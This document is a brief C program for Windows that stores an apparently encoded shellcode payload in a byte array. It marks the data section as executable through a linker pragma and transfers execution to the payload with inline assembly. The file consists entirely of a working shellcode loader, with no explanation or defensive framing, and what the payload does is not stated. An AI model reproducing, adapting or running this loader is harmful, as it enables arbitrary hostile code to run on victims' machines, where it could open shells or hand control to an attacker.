#include <windows.h>
#include <stdio.h>
#pragma comment(linker, "/section:.data,RWE")
unsigned char shellcode[] = "\xdb\xd4\xbd\xbf\x27\x26\x73\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x56\x83\xe8\xfc\x31\x68\x14\x03\x68\xab\xc5\xd3\x8f\x3b\x8b"
"\x1c\x70\xbb\xec\x95\x95\x8a\x2c\xc1\xde\xbc\x9c\x81\xb3\x30"
"\x56\xc7\x27\xc3\x1a\xc0\x48\x64\x90\x36\x66\x75\x89\x0b\xe9"
"\xf5\xd0\x5f\xc9\xc4\x1a\x92\x08\x01\x46\x5f\x58\xda\x0c\xf2"
"\x4d\x6f\x58\xcf\xe6\x23\x4c\x57\x1a\xf3\x6f\x76\x8d\x88\x29"
"\x58\x2f\x5d\x42\xd1\x37\x82\x6f\xab\xcc\x70\x1b\x2a\x05\x49"
"\xe4\x81\x68\x66\x17\xdb\xad\x40\xc8\xae\xc7\xb3\x75\xa9\x13"
"\xce\xa1\x3c\x80\x68\x21\xe6\x6c\x89\xe6\x71\xe6\x85\x43\xf5"
"\xa0\x89\x52\xda\xda\xb5\xdf\xdd\x0c\x3c\x9b\xf9\x88\x65\x7f"
"\x63\x88\xc3\x2e\x9c\xca\xac\x8f\x38\x80\x40\xdb\x30\xcb\x0c"
"\x28\x79\xf4\xcc\x26\x0a\x87\xfe\xe9\xa0\x0f\xb2\x62\x6f\xd7"
"\xc3\x65\x90\x07\x6b\xe5\x6e\xa8\x8b\x2f\xb5\xfc\xdb\x47\x1c"
"\x7d\xb0\x97\xa1\xa8\x2c\x92\x35\x93\x18\x15\x4f\x7b\x5a\x5a"
"\x41\x20\xd3\xbc\x31\x88\xb3\x10\xf2\x78\x73\xc1\x9a\x92\x7c"
"\x3e\xba\x9c\x57\x57\x51\x73\x01\x0f\xce\xea\x08\xdb\x6f\xf2"
"\x87\xa1\xb0\x78\x2d\x55\x7e\x89\x44\x45\x97\xee\xa6\x95\x68"
"\x9b\xa6\xff\x6c\x0d\xf1\x97\x6e\x68\x35\x38\x90\x5f\x46\x3f"
"\x6e\x1e\x7e\x4b\x59\xb4\x3e\x23\xa6\x58\xbe\xb3\xf0\x32\xbe"
"\xdb\xa4\x66\xed\xfe\xaa\xb2\x82\x52\x3f\x3d\xf2\x07\xe8\x55"
"\xf8\x7e\xde\xf9\x03\x55\x5c\xfd\xfb\x2b\x4b\xa6\x93\xd3\xcb"
"\x56\x63\xbe\xcb\x06\x0b\x35\xe3\xa9\xfb\xb6\x2e\xe2\x93\x3d"
"\xbf\x40\x02\x41\xea\x05\x9a\x42\x19\x9e\x2d\x38\x52\x21\xce"
"\xbd\x7a\x46\xcf\xbd\x82\x78\xec\x6b\xbb\x0e\x33\xa8\xf8\x01"
"\x06\x8d\xa9\x8b\x68\x81\xaa\x99";

void main()
{

    __asm
    {

        mov eax, offset shellcode
        jmp eax

    }
}